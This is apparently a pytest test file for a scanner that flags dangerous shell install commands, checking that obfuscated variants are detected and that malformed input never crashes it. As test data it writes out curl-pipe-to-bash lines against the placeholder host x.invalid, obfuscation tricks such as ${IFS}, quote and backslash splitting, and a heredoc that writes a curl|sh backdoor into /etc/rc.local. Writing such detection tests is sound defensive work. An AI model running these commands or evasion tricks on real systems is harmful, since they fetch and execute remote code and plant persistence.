"""Adversarial tests: obfuscation, evasion attempts, malformed input.

The scanner must never crash, never execute anything, and must see through
common obfuscation tricks (or at worst, still produce a useful finding).
"""
import random
import string

import pytest

from cex_installguard import shellparser as sp
from cex_installguard.scanner import scan_text


def ids(text):
    return {f.rule_id for f in scan_text(text)}


# --------------------------------------------------------------------------- #
# Obfuscation that must STILL be detected                                       #
# --------------------------------------------------------------------------- #

def test_ifs_obfuscated_curl_pipe():
    # ${IFS} used as whitespace between words
    assert 'IG001' in ids('curl${IFS}http://x.invalid/a|bash')
    assert 'IG001' in ids('curl${IFS}-sL${IFS}http://x.invalid/a${IFS}|${IFS}sh')


def test_quote_split_command_name():
    assert 'IG001' in ids('"cu""rl" http://x.invalid/a | bash')


def test_backslash_split_command_name():
    assert 'IG001' in ids('cu\\rl http://x.invalid/a | ba\\sh')


def test_backtick_substitution_pipe():
    assert 'IG001' in ids('`curl http://x.invalid/a | sh`')


def test_cmdsub_wrapping_remote_pipe():
    assert 'IG001' in ids('eval "$(curl -s http://x.invalid/a | sh)"')


def test_variable_indirection_remote():
    text = ('SRC="https://x.invalid/p"\n'
            'DATA="$SRC"\n'
            'curl -s "$DATA" -o /tmp/p\n'
            'chmod +x /tmp/p\n')
    assert 'IG049' in ids(text)


def test_subshell_wrapping():
    assert 'IG001' in ids('(curl -s http://x.invalid/a | sh)')


def test_nested_subshell_wrapping():
    assert 'IG001' in ids('( (curl -s http://x.invalid/a | sh) )')


def test_heredoc_written_to_persistence_path():
    text = ('cat <<EOF > /etc/rc.local\n'
            '#!/bin/sh\n'
            'curl http://x.invalid/bd | sh\n'
            'EOF\n')
    assert 'IG009' in ids(text)


def test_b64_blob_still_flagged():
    blob = 'A' * 200
    assert 'IG044' in ids(f'echo "{blob}"')


def test_keyword_indicator_in_cmdsub():
    assert any(f.rule_id == 'KW001'
               for f in scan_text('echo "installing backdoor now"'))


# --------------------------------------------------------------------------- #
# Malformed input must never crash the scanner                                  #
# --------------------------------------------------------------------------- #

def test_malformed_inputs_never_raise():
    cases = [
        '(((((', '))))', '$$$$$', '```', '"', "'", '\\', '<<', '<<EOF',
        '$(', '${', '$((', '&', '&&&', '|||', 'a | | b', 'x 2>', '||',
        'echo "$((', 'if then else', 'for i in', 'case x in',
        '\x00'.join(['echo']), 'echo \\', 'curl |', '| curl',
    ]
    for c in cases:
        scan_text(c)          # must not raise


def test_fuzz_random_garbage():
    rng = random.Random(1234)
    alphabet = string.printable
    for _ in range(200):
        n = rng.randint(0, 80)
        junk = ''.join(rng.choice(alphabet) for _ in range(n))
        scan_text(junk)       # must not raise


def test_fuzz_truncated_dangerous():
    dangerous = 'curl -sSL https://x.invalid/a | bash'
    for cut in range(1, len(dangerous)):
        scan_text(dangerous[:cut])   # every prefix must be safe to parse


def test_deeply_nested_subshells():
    depth = 40
    text = '(' * depth + 'echo hi' + ')' * depth
    scan_text(text)


def test_massive_line():
    scan_text('echo ' + 'x' * 500000 + '\n')


def test_many_statements():
    scan_text('\n'.join(f'echo {i}' for i in range(2000)))


def test_unicode_content():
    scan_text('echo "héllo wörld ünïcode ✓"\ncurl http://x.invalid/a | sh\n')


def test_crlf_line_endings():
    assert 'IG001' in ids('curl http://x.invalid/a | bash\r\n')
